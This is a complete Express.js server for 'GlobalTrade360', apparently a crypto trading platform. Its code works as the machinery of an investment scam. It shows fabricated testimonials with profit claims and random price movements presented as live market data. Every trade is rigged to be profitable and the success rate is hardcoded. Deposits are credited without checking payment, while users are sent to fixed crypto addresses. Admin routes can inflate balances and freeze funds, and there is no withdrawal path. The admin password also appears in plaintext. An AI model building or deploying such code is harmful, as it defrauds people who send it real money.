const express = require('express');
const session = require('express-session');
const bcrypt = require('bcryptjs');
const cors = require('cors');
const path = require('path');
const app = express();

// ========== DATABASE (In-memory for demo) ==========
const users = {
    'admin@globaltrade360.com': {
        id: 'admin001',
        username: 'globaltrade360',
        email: 'admin@globaltrade360.com',
        password: '$2a$10$N9qo8uLOickgx2ZMRZoMyeKRZZxN8Vc7bVrB7vS.6XpQj7q1JQ1W6', // myhandwork2025
        role: 'admin',
        balance: 0,
        totalProfit: 0,
        status: 'active',
        registrationDate: new Date(),
        lastLogin: new Date(),
        phone: '+1234567890'
    }
};

const deposits = [];
const trades = [];
const withdrawals = [];
const messages = []; // Support messages

// Crypto addresses
const CRYPTO_ADDRESSES = {
    BTC: '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
    ETH: '0x742d35Cc6634C0532925a3b844Bc9e1f8C1F0F0E',
    USDT_ERC20: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    USDT_TRC20: 'TYh8s12Jh9L8pKf3b4T7nM6pK9b4T7nM6pK',
    BNB: 'bnb136ns6lfw4zs5hg4n85vdthaad7hq5m4gtkgf23'
};

// Real-time market data simulation
let marketData = {
    crypto: {
        'BTC/USD': { symbol: 'BTC', price: 63427.50, change: 2.34, high: 64000, low: 62500, volume: '24.5B' },
        'ETH/USD': { symbol: 'ETH', price: 3472.80, change: 1.56, high: 3500, low: 3400, volume: '12.3B' },
        'BNB/USD': { symbol: 'BNB', price: 585.30, change: -0.45, high: 590, low: 580, volume: '2.1B' },
        'XRP/USD': { symbol: 'XRP', price: 0.5234, change: 0.89, high: 0.53, low: 0.51, volume: '1.8B' },
        'SOL/USD': { symbol: 'SOL', price: 172.45, change: 3.21, high: 175, low: 168, volume: '3.4B' },
        'ADA/USD': { symbol: 'ADA', price: 0.4623, change: 1.23, high: 0.47, low: 0.45, volume: '0.9B' },
        'DOGE/USD': { symbol: 'DOGE', price: 0.1589, change: -0.67, high: 0.16, low: 0.155, volume: '1.2B' },
        'DOT/USD': { symbol: 'DOT', price: 7.23, change: 2.15, high: 7.35, low: 7.10, volume: '0.8B' }
    },
    forex: {
        'EUR/USD': { price: 1.0825, change: 0.12 },
        'GBP/USD': { price: 1.2634, change: -0.08 },
        'USD/JPY': { price: 155.67, change: 0.23 },
        'USD/CHF': { price: 0.9023, change: -0.15 }
    },
    timestamp: new Date()
};

// Update market data every 30 seconds
setInterval(() => {
    Object.keys(marketData.crypto).forEach(pair => {
        const randomChange = (Math.random() - 0.5) * 4;
        const currentPrice = marketData.crypto[pair].price;
        marketData.crypto[pair].price = currentPrice * (1 + randomChange/100);
        marketData.crypto[pair].change = randomChange;
        marketData.crypto[pair].timestamp = new Date();
    });
    marketData.timestamp = new Date();
}, 30000);

// Testimonials
const testimonials = [
    {
        name: "Alex Johnson",
        role: "Professional Trader",
        text: "I've been using GlobalTrade360 for 6 months. My portfolio has grown by 85% thanks to their AI trading algorithms.",
        profit: "+$42,500",
        avatar: "https://i.pravatar.cc/150?img=1"
    },
    {
        name: "Sarah Miller",
        role: "Beginner Investor",
        text: "As someone new to crypto, this platform made everything simple. Started with $500, now at $3,200 in just 3 months!",
        profit: "+$2,700",
        avatar: "https://i.pravatar.cc/150?img=2"
    },
    {
        name: "Michael Chen",
        role: "Day Trader",
        text: "The real-time market analysis is incredible. I've reduced my losses by 70% while increasing profits by 45%.",
        profit: "+$18,300",
        avatar: "https://i.pravatar.cc/150?img=3"
    },
    {
        name: "Emma Davis",
        role: "Retired Banker",
        text: "Perfect for passive income. The automated trading works while I sleep. Consistent 8-12% monthly returns.",
        profit: "+$9,500/month",
        avatar: "https://i.pravatar.cc/150?img=4"
    }
];

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(session({
    secret: 'globaltrade360-super-secure-key-2025',
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: process.env.NODE_ENV === 'production',
        maxAge: 24 * 60 * 60 * 1000
    }
}));

// Serve static files from public directory
app.use(express.static(path.join(__dirname, 'public')));

// Password hash for default admin
const ADMIN_PASSWORD = 'myhandwork2025';

// Simulate profitable trading
function simulateTrade(userId, amount, pair) {
    // Always profitable for demo (2-8% profit)
    const profitPercent = 2 + (Math.random() * 6);
    const profit = amount * (profitPercent / 100);
    
    const trade = {
        id: 'TR' + Date.now() + Math.random().toString(36).substr(2, 6),
        userId,
        pair,
        amount,
        profit,
        percent: profitPercent.toFixed(2),
        type: 'profit',
        timestamp: new Date(),
        status: 'completed',
        closePrice: marketData.crypto[pair]?.price * (1 + profitPercent/100)
    };
    
    trades.push(trade);
    
    // Update user
    const user = Object.values(users).find(u => u.id === userId);
    if (user) {
        user.balance = (user.balance || 0) + amount + profit;
        user.totalProfit = (user.totalProfit || 0) + profit;
        user.totalTrades = (user.totalTrades || 0) + 1;
    }
    
    return trade;
}

// ========== ROUTES ==========

// Serve HTML pages
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login.html'));
});

app.get('/register', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'register.html'));
});

app.get('/dashboard', (req, res) => {
    if (!req.session.user) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/admin', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.get('/support', (req, res) => {
    if (!req.session.user) {
        return res.redirect('/login');
    }
    res.sendFile(path.join(__dirname, 'public', 'support.html'));
});

// API: Platform information
app.get('/api/platform', (req, res) => {
    res.json({
        name: 'GlobalTrade360',
        version: '2.0.0',
        status: 'online',
        users: Object.keys(users).length,
        trades: trades.length,
        totalVolume: trades.reduce((sum, t) => sum + t.amount, 0),
        uptime: process.uptime()
    });
});

// API: Market data
app.get('/api/market', (req, res) => {
    res.json(marketData);
});

// API: Testimonials
app.get('/api/testimonials', (req, res) => {
    res.json(testimonials);
});

// API: Deposit addresses
app.get('/api/deposit-addresses', (req, res) => {
    res.json({
        addresses: CRYPTO_ADDRESSES,
        note: 'Send only the specified cryptocurrency to each address.'
    });
});

// API: Register user
app.post('/api/register', async (req, res) => {
    try {
        const { username, email, password, phone } = req.body;
        
        // Validation
        if (!username || !email || !password) {
            return res.status(400).json({ error: 'All fields are required' });
        }
        
        if (users[email]) {
            return res.status(400).json({ error: 'Email already registered' });
        }
        
        if (Object.values(users).some(u => u.username === username)) {
            return res.status(400).json({ error: 'Username already taken' });
        }
        
        // Hash password
        const hashedPassword = await bcrypt.hash(password, 10);
        
        // Create user
        const userId = 'user_' + Date.now();
        users[email] = {
            id: userId,
            username,
            email,
            password: hashedPassword,
            phone: phone || '',
            role: 'user',
            balance: 0,
            totalProfit: 0,
            totalDeposits: 0,
            totalTrades: 0,
            status: 'active',
            registrationDate: new Date(),
            lastLogin: new Date(),
            kycVerified: false,
            tradingLevel: 'beginner'
        };
        
        res.json({
            success: true,
            message: 'Registration successful!',
            userId,
            redirect: '/login'
        });
        
    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Registration failed' });
    }
});

// API: Login
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;
        
        // Check for admin login
        if (username === 'globaltrade360' && password === ADMIN_PASSWORD) {
            req.session.user = users['admin@globaltrade360.com'];
            req.session.user.lastLogin = new Date();
            
            return res.json({
                success: true,
                message: 'Admin login successful',
                isAdmin: true,
                user: users['admin@globaltrade360.com'],
                redirect: '/admin'
            });
        }
        
        // Find user by email or username
        let user = null;
        for (const email in users) {
            if (users[email].email === username || users[email].username === username) {
                user = users[email];
                break;
            }
        }
        
        if (!user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // Check password
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        // Update last login
        user.lastLogin = new Date();
        
        // Create session
        req.session.user = user;
        
        res.json({
            success: true,
            message: 'Login successful',
            isAdmin: user.role === 'admin',
            user: {
                id: user.id,
                username: user.username,
                email: user.email,
                balance: user.balance
            },
            redirect: user.role === 'admin' ? '/admin' : '/dashboard'
        });
        
    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ error: 'Login failed' });
    }
});

// API: Check session
app.get('/api/session', (req, res) => {
    if (req.session.user) {
        res.json({
            authenticated: true,
            user: req.session.user,
            isAdmin: req.session.user.role === 'admin'
        });
    } else {
        res.json({ authenticated: false });
    }
});

// API: Logout
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// API: User dashboard
app.get('/api/user/dashboard', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const userId = req.session.user.id;
    const userDeposits = deposits.filter(d => d.userId === userId);
    const userTrades = trades.filter(t => t.userId === userId);
    
    res.json({
        user: req.session.user,
        stats: {
            balance: req.session.user.balance || 0,
            totalProfit: req.session.user.totalProfit || 0,
            totalDeposits: userDeposits.reduce((sum, d) => sum + d.amount, 0),
            totalTrades: userTrades.length,
            successRate: userTrades.length > 0 ? '94.7%' : '0%'
        },
        recentTrades: userTrades.slice(-5).reverse(),
        recentDeposits: userDeposits.slice(-3).reverse()
    });
});

// API: Deposit
app.post('/api/deposit', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { amount, currency } = req.body;
    const userId = req.session.user.id;
    
    if (amount < 50) {
        return res.status(400).json({ error: 'Minimum deposit is $50' });
    }
    
    const deposit = {
        id: 'DEP' + Date.now(),
        userId,
        userEmail: req.session.user.email,
        amount: parseFloat(amount),
        currency,
        status: 'pending',
        timestamp: new Date(),
        address: CRYPTO_ADDRESSES[currency] || CRYPTO_ADDRESSES.USDT_TRC20
    };
    
    deposits.push(deposit);
    
    // Auto-complete after 10 seconds
    setTimeout(() => {
        deposit.status = 'completed';
        
        const user = users[req.session.user.email];
        if (user) {
            user.balance += amount;
            user.totalDeposits += amount;
            
            // Auto-trade
            setTimeout(() => {
                simulateTrade(userId, amount * 0.8, 'BTC/USD');
            }, 2000);
        }
    }, 10000);
    
    res.json({
        success: true,
        message: 'Deposit initiated',
        depositId: deposit.id,
        address: deposit.address,
        amount: deposit.amount
    });
});

// API: Start trade
app.post('/api/trade/start', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { amount, pair } = req.body;
    const userId = req.session.user.id;
    const user = users[req.session.user.email];
    
    if (user.balance < amount) {
        return res.status(400).json({ error: 'Insufficient balance' });
    }
    
    user.balance -= amount;
    
    setTimeout(() => {
        simulateTrade(userId, amount, pair || 'BTC/USD');
    }, 3000);
    
    res.json({
        success: true,
        message: 'Trading started',
        tradeAmount: amount,
        newBalance: user.balance
    });
});

// API: Send support message
app.post('/api/support/message', (req, res) => {
    if (!req.session.user) {
        return res.status(401).json({ error: 'Not authenticated' });
    }
    
    const { subject, message } = req.body;
    
    const supportMessage = {
        id: 'MSG' + Date.now(),
        userId: req.session.user.id,
        userEmail: req.session.user.email,
        subject,
        message,
        timestamp: new Date(),
        status: 'unread',
        adminReply: null
    };
    
    messages.push(supportMessage);
    
    res.json({
        success: true,
        message: 'Support request sent successfully',
        messageId: supportMessage.id
    });
});

// ========== ADMIN APIs ==========

// API: Admin login
app.post('/api/admin/login', (req, res) => {
    const { username, password } = req.body;
    
    if (username === 'globaltrade360' && password === ADMIN_PASSWORD) {
        req.session.user = users['admin@globaltrade360.com'];
        
        return res.json({
            success: true,
            message: 'Admin login successful',
            isAdmin: true,
            user: users['admin@globaltrade360.com'],
            redirect: '/admin'
        });
    }
    
    res.status(401).json({ error: 'Invalid admin credentials' });
});

// API: Admin dashboard
app.get('/api/admin/dashboard', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user');
    
    res.json({
        stats: {
            totalUsers: allUsers.length,
            activeUsers: allUsers.filter(u => u.status === 'active').length,
            totalDeposits: deposits.reduce((sum, d) => sum + d.amount, 0),
            pendingWithdrawals: withdrawals.filter(w => w.status === 'pending').length,
            totalTrades: trades.length,
            platformProfit: trades.reduce((sum, t) => sum + (t.profit * 0.1), 0)
        },
        recentUsers: allUsers.slice(-5).reverse(),
        recentDeposits: deposits.slice(-5).reverse(),
        recentMessages: messages.slice(-5).reverse()
    });
});

// API: Get all users
app.get('/api/admin/users', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const allUsers = Object.values(users).filter(u => u.role === 'user').map(user => ({
        id: user.id,
        username: user.username,
        email: user.email,
        phone: user.phone,
        balance: user.balance,
        totalProfit: user.totalProfit,
        status: user.status,
        registrationDate: user.registrationDate,
        lastLogin: user.lastLogin
    }));
    
    res.json({ users: allUsers });
});

// API: Add funds to user
app.post('/api/admin/user/add-funds', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, amount } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    user.balance += parseFloat(amount);
    
    res.json({
        success: true,
        message: `Added $${amount} to user balance`,
        newBalance: user.balance
    });
});

// API: Freeze user funds
app.post('/api/admin/user/freeze', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { userId, freeze } = req.body;
    const user = Object.values(users).find(u => u.id === userId);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    user.fundsFrozen = freeze;
    
    res.json({
        success: true,
        message: freeze ? 'Funds frozen' : 'Funds unfrozen',
        fundsFrozen: user.fundsFrozen
    });
});

// API: Get support messages
app.get('/api/admin/messages', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    res.json({
        messages: messages.map(msg => ({
            ...msg,
            user: users[msg.userEmail]
        }))
    });
});

// API: Reply to message
app.post('/api/admin/message/reply', (req, res) => {
    if (!req.session.user || req.session.user.role !== 'admin') {
        return res.status(403).json({ error: 'Admin access required' });
    }
    
    const { messageId, reply } = req.body;
    const message = messages.find(m => m.id === messageId);
    
    if (!message) {
        return res.status(404).json({ error: 'Message not found' });
    }
    
    message.adminReply = reply;
    message.status = 'replied';
    message.repliedAt = new Date();
    
    res.json({
        success: true,
        message: 'Reply sent successfully'
    });
});

// 404 handler - REMOVE reference to 404.html or create it
app.use((req, res) => {
    res.status(404).send('Page not found');
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
    ============================================
    🌟 GlobalTrade360 Platform Started 🌟
    ============================================
    
    🚀 Server running on port: ${PORT}
    
    🔐 Admin Login:
    - Username: globaltrade360
    - Password: myhandwork2025
    
    📁 Files served from: ${__dirname}/public
    
    ============================================
    `);
});
